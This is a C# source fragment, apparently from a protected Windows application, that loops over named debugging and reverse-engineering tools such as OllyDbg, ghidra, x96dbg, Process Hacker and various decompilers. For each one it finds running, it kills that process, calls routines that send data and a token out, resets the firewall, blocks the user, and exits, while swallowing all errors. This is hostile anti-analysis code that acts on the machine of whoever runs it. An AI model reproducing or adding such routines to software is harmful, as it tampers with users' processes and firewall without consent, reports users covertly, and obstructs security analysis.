                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process56 in Process.GetProcessesByName("mdb"))
                {
                    process56.Kill();
                    PR = process56.ProcessName;
                    //API.log(Auth.appName, process56.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }

                foreach (Process process68 in Process.GetProcessesByName("Reflector"))
                {
                    process68.Kill();
                    PR = process68.ProcessName;
                    //API.log(Auth.appName, process68.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process70 in Process.GetProcessesByName("Black_Olly"))
                {
                    process70.Kill();
                    PR = process70.ProcessName;
                    //API.log(Auth.appName, process70.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process71 in Process.GetProcessesByName("OLLYDBG"))
                {
                    process71.Kill();
                    PR = process71.ProcessName;
                    //API.log(Auth.appName, process71.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process72 in Process.GetProcessesByName("BladeAPIMonitor"))
                {
                    process72.Kill();
                    PR = process72.ProcessName;
                    //API.log(Auth.appName, process72.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process73 in Process.GetProcessesByName("ProcMonX"))
                {
                    process73.Kill();
                    PR = process73.ProcessName;
                    //API.log(Auth.appName, process73.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process75 in Process.GetProcessesByName("ProcessActivityView"))
                {
                    process75.Kill();
                    PR = process75.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process76 in Process.GetProcessesByName("ranko"))
                {
                    process76.Kill();
                    PR = process76.ProcessName;
                    //API.log(Auth.appName, process79.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process77 in Process.GetProcessesByName("XTREME DUMPER"))
                {
                    process77.Kill();
                    PR = process77.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process77 in Process.GetProcessesByName("system explorer"))
                {
                    process77.Kill();
                    PR = process77.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("systemexplorerservice"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("WPE PRO"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("ghidra"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("NLClientApp"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("CodeReflect"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("JustDecompile"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("x96dbg"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("reverse"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("reversal"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("die"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("process hacker"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    resetfirewall();
                    //Application.Exit();
                    Environment.Exit(0);
                }
                foreach (Process process in Process.GetProcessesByName("StringDecryptor"))
                {
                    process.Kill();
                    PR = process.ProcessName;
                    //API.log(Auth.appName, process80.ProcessName);
                    SEND(WW);
                    Sendtoken();
                    ResetfirewallAndBlockUser();
                    //RESTART();
                    //Application.Exit();
                    Environment.Exit(0);
                }

            }
            catch (Exception)
            {

            }
            #endregion
        }
    }
}
